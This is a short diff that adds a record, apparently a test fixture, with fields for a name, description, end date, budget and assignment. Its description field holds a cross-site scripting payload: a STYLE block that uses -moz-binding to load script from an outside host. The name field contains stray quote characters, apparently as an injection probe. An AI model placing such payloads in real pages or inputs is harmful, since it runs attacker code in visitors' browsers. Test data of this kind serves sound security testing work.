@@ -1,0 +1,6 @@
+name : FP.'O'.
+desc : <STYLE>BODY{-moz-binding:url("http://ha.ckers.org/xssmoz.xml#xss")}</STYLE>
+end : 28.6.2016
+budget : 5,127
+assignto[] : 1
+assignme : 1
